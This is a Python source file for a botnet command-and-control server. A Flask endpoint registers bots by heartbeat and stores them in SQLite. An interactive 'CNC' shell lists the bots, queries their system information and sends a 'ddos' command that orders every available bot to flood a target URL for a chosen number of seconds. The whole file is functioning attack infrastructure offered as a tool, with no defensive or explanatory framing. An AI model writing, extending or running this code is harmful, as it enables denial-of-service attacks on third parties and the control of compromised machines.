from flask import Flask, request
from werkzeug.serving import make_server
from enum import Enum
import threading
import sqlite3
import logging
import requests
import cmd
import re
import time

flaskServer = None
db = None

def main():
    global server, db
    db = DB()
    db.execute("UPDATE bots SET status = 'offline'")
    flaskServer = FlaskServer(5000)
    flaskServer.run()
    log = logging.getLogger('werkzeug')
    log.disabled = True
    threading.Thread(target = lambda: checkHeartBeat()).start()
    CommandShell().cmdloop()

class BotStatus(str, Enum):
    ONLINE = "online",
    OFFLINE = "offline",
    RUNNING = "running"

class CommandShell(cmd.Cmd):
    intro = 'CNC started. Type help or ? to list commands.'
    prompt = '(CNC)> '
    
    def do_systeminfo(self, args):
        'Get the system informations of the connected bots or just a single one.'
        def getSystemInfo(client):
            try:
                db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.RUNNING)
                result = requests.get(f"http://{client['ip_address']}:{client['listening_port']}/systeminfo", timeout=5).json()
                print(f"[{result['mac-address']}]\n\tHostname: {result['hostname']}\n\tListening Address: http://{client['ip_address']}:{client['listening_port']}\n\tPlatform: {result['platform']} {result['platform-release']} {result['platform-version']}\n\tArchitecture: {result['architecture']}\n\tProcessor: {result['processor']}\n\tRAM: {result['ram']}")
                db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.ONLINE)
            except ConnectionError as e:
                print(f"{client['mac_address']} is offline.")
                db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.OFFLINE)
            except Exception as e:
                db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.ONLINE)

        args = split_string(args)
        if args:
            bot = db.getSingleBot(args[0])
            if bot:
                getSystemInfo(bot)
            else:
                print(f"Client with mac address \"{args[0]}\" not found")
        else:
            bots = db.getAllAvailableBots()
            if bots:
                for bot in bots:
                    getSystemInfo(bot)

    def do_listbots(self, args):
        'List all bots with the relative statuses.'
        def printBots(bots):
            if (bots):
                for bot in bots:
                    print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
        args = split_string(args)
        if args:
            match (args[0]):
                case "online":
                    printBots(db.getAllOnlineBots())
                case "available":
                    printBots(db.getAllAvailableBots())
                case "all":
                   printBots(db.getAllBots())
                case _:
                    print("Subcommands: online, available, all")
        else:
            print("Subcommands: online, available, all")
    
    def complete_listbots(self, text, line, begidx, endidx):
        subcommands = ["online", "available", "all"]
        completitions = [command for command in subcommands if command.startswith(text)]
        return completitions
    
    def do_ddos(self, args):
        'DDOSl a target with all available bots (default 10 seconds).'
        def ddos(bot, body):
            try:
                db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.RUNNING)
                requests.post(f"http://{bot['ip_address']}:{bot['listening_port']}/ddos", json=body)
                db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
            except ConnectionError as e:
                print(f"{bot['mac_address']} is offline.")
                db.updateLastTask("failed_systeminfo", None, bot['mac_address'], BotStatus.OFFLINE)
            except Exception:
                db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
        args = split_string(args)

        if args:
            body = {}
            body['url'] = args[0]
            body['timeSeconds'] = 10
            if len(args) >= 2 and args[1].isdigit():
                body['timeSeconds'] = int(args[1])
            bots = db.getAllAvailableBots()
            if bots:
                for bot in bots:
                    threading.Thread(target = lambda: ddos(bot, body)).start()
            


def split_string(string):
    parts = re.findall(r'"[^"]+"|\S+', string)
    result = [part.strip('"') for part in parts]
    return result

class FlaskServer:
    app = Flask(__name__)

    def __init__(self, port):
        self.port = port

    def run(self):
        server = make_server('0.0.0.0', 5000, self.app)
        threading.Thread(target = lambda: server.serve_forever()).start()
        
    @app.route('/heartbeat', methods = ['POST'])
    def heartbeat():
        json = request.get_json()
        macaddress = json['mac-address']
        ipaddr = request.remote_addr
        port = json['running-port']
        startingup = bool(json['starting-up'])
        status = "online"
        if not startingup:
            res = db.getSingleBot(macaddress)
            if res:
                status = "running" if res['status'] == "running" else "online"

        db.execute("INSERT INTO bots (mac_address, ip_address, listening_port, status) VALUES (?, ?, ?, ?) ON CONFLICT(mac_address) DO UPDATE SET ip_address = excluded.ip_address, listening_port = excluded.listening_port, status = excluded.status, last_heartbeat = CURRENT_TIMESTAMP", macaddress, ipaddr, port, status)
        return "", 200

class DB:
    con = sqlite3.connect('./bots.sqlite', check_same_thread=False)

    def __init__(self):
        self.con.row_factory = sqlite3.Row
        cur = self.con.cursor()
        cur.execute("PRAGMA foreign_keys = ON;")
        cur.execute('''
            CREATE TABLE IF NOT EXISTS bots (
            mac_address TEXT NOT NULL PRIMARY KEY,
            ip_address TEXT NOT NULL,
            listening_port INTEGER NOT NULL,
            status text "online",
            last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_target TEXT,
            last_task TEXT,
            last_task_timestamp DATETIME)
        ''')
        cur.close()
        self.con.commit()
    
    def execute(self, query: str, *arg):
        cur = self.con.cursor()
        cur.execute("PRAGMA foreign_keys = ON;")
        res = cur.execute(query, arg)
        rows = res.fetchall()
        cur.close()
        self.con.commit()
        if (len(rows) > 0):
            return [dict(i) for i in rows]
        return None

    def getAllBots(self):
        return self.execute("SELECT * FROM bots")
    
    def getAllOnlineBots(self):
        return self.execute("SELECT * FROM bots WHERE status IN (?, ?)", BotStatus.ONLINE, BotStatus.RUNNING)

    def getAllAvailableBots(self):
        return self.execute("SELECT * FROM bots WHERE status = ?", BotStatus.ONLINE)

    def getSingleBot(self, macaddress: str):
        res = self.execute("SELECT * FROM bots WHERE mac_address = ?", macaddress)
        if res:
            return res[0]
        return None
        
    def setStatus(self, status: str, macaddr: str):
        self.execute("UPDATE bots SET status = ? WHERE mac_address = ?", status, macaddr)

    def updateLastTask(self, name: str, target:str, macaddr: str, status: str):
        self.execute("UPDATE bots SET last_task = ?, last_target = ?, last_task_timestamp = CURRENT_TIMESTAMP, status = ? WHERE mac_address = ?", name, target, status, macaddr)
    
    def setOfflineHeartBeat(self):
        self.execute("UPDATE bots SET status = 'offline' WHERE ((julianday(CURRENT_TIMESTAMP) - julianday(last_heartbeat)) * 86400) > 120")

def checkHeartBeat():
    while True:
        db.setOfflineHeartBeat()
        time.sleep(60)

if __name__ == "__main__":
    main()